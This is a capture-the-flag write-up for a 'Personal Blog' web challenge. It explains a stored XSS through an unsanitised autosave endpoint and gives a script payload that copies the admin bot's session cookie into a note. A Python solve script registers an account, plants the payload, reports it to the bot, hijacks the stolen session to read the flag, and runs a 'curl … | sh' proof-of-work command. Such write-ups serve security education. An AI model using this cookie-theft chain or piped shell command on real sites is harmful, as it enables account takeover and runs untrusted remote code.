---
created: 2026-01-12T00:07
updated: 2026-01-12T00:22
points: 40
solves: 283
title: Personal Blog
description: just xss
---

## xss
The server performs `sanitizeHtml` on `/api/save` but not `/api/autosave`, this is really suspicious.

```js
app.post("/api/save", requireLogin, (req, res) => {
  const db = req.db;
  const postId = Number.parseInt(req.body.postId, 10);
  if (!Number.isFinite(postId)) {
    return res.status(400).json({ ok: false });
  }
  const post = getPostById(db, req.user.id, postId);
  if (!post) {
    return res.status(404).json({ ok: false });
  }
  const rawContent = String(req.body.content || "");
  const sanitized = sanitizeHtml(rawContent);
  post.savedContent = sanitized;
  post.draftContent = sanitized;
  post.updatedAt = Date.now();
  saveDb(db);
  return res.json({ ok: true });
});

app.post("/api/autosave", requireLogin, (req, res) => {
  const db = req.db;
  const postId = Number.parseInt(req.body.postId, 10);
  if (!Number.isFinite(postId)) {
    return res.status(400).json({ ok: false });
  }
  const post = getPostById(db, req.user.id, postId);
  if (!post) {
    return res.status(404).json({ ok: false });
  }
  const rawContent = String(req.body.content || "");
  post.draftContent = rawContent;
  post.updatedAt = Date.now();
  saveDb(db);
  return res.json({ ok: true });
});
```

`draftContent` is then rendered inside `editor`.

```js
const draftContent = post.draftContent || post.savedContent || "";
return res.render("editor", {
	post,
	draftContent,
});
```

It is rendered without HTML escaping.

```html
<div id="editor" class="editor" data-post-id="<%= post.id %>" contenteditable="true"><%- draftContent %></div>
```

XSS!

... wait but it doesn't work.

`/edit` finds notes based on user id, so the admin won't actually see our notes.

Well this is easily fixed with `/magic` token that let the admin bot read the page as us.

Furthermore the previous admin cookie is saved, not overwritten.

```js
app.get("/magic/:token", (req, res) => {
  const db = req.db;
  const token = req.params.token;
  const record = db.magicLinks[token];
  if (!record) {
    return res.status(404).send("Invalid token.");
  }

  const existingSid = req.cookies.sid;
  if (existingSid) {
    res.cookie("sid_prev", existingSid, cookieOptions());
  }
  const sid = createSession(db, record.userId);
  saveDb(db);
  res.cookie("sid", sid, cookieOptions());

  const target = safeRedirect(req.query.redirect);
  return res.redirect(target);
});
```

## admin cookie

To read the flag we need the admin's cookies, I tried sending the cookie out but it didn't work so I just made the admin bot edit the note and send it.

```html
<script>
setTimeout(()=>{
document.querySelector("#editor").innerHTML += "\\n" + document.cookie;
document.querySelector("#saveButton").click()
}, 100)
</script>
```

## solve script

```python
import os
import re
import requests
from time import sleep

target = "http://34.26.148.28:5000"
# target = "http://localhost:3000"
s = requests.Session()
s.post(f"{target}/register", json={
    "username": "kumo",
    "password": "kumokumo"
})
s.post(f"{target}/login", json={
    "username": "kumo",
    "password": "kumokumo"
})
print(s.cookies)
url = s.get(f"{target}/edit").url
id = url.split("/")[-1]
print(url, id)
payload = """
<script>
setTimeout(()=>{
document.querySelector("#editor").innerHTML += "\\n" + document.cookie;
document.querySelector("#saveButton").click()
}, 100)
</script>
"""
r = s.post(f"{target}/api/autosave", json={
    "postId": id,
    "content": payload
})
print(r)
print(f"{target}/edit/{id}")

magic = s.post(f"{target}/magic/generate").text
magic = magic.split('<a href="/magic/')[1].split('">/magic')[0]
report = f"http://localhost:3000/magic/{magic}?redirect=/edit/{id}"

# report = f"http://localhost:3000/edit/{id}"
html = s.get(f"{target}/report").text
chal = html.split("<code>")[1].split("</code>")[0]
pattern = r'^curl -sSfL https\:\/\/pwn\.red\/pow \| sh -s [A-Za-z0-9\-_.=/+]+$'
assert re.match(pattern, chal), f"'{chal}' does not match expected format"
pow_solution = os.popen(chal).read()
pow_challenge = html.split('name="pow_challenge" value="')[1].split('" />')[0]
print(pow_challenge)
print(pow_solution)
print("reporting", report)
# stop, wait = webhook(1337)
assert "Admin is on the way." in s.post(f"{target}/report", json={
    "url": report,
    "pow_challenge": pow_challenge,
    "pow_solution": pow_solution
}).text, "report failed"

# data = wait()
# print(data)
# stop()

sleep(5)

content = s.get(f"{target}/edit/{id}").text
print(content)
sid = content.split("sid_prev=")[1].split(";")[0]
print(sid)

s.cookies.set(
    name="sid",
    value=sid,
    domain="34.26.148.28",
    path="/"
)

print(s.get(f"{target}/flag").text)
```

And we have our flag

```flag
uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}
```

... but @aelmo already solved it and submitted the flag 😭

I said I was gonna look into personal blog but @aelmo thought I was going to read my own blog rip.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1768195338/20260112002218392.png/16aaf9cbc8252fe91f6a1c0c2050c14a.png)
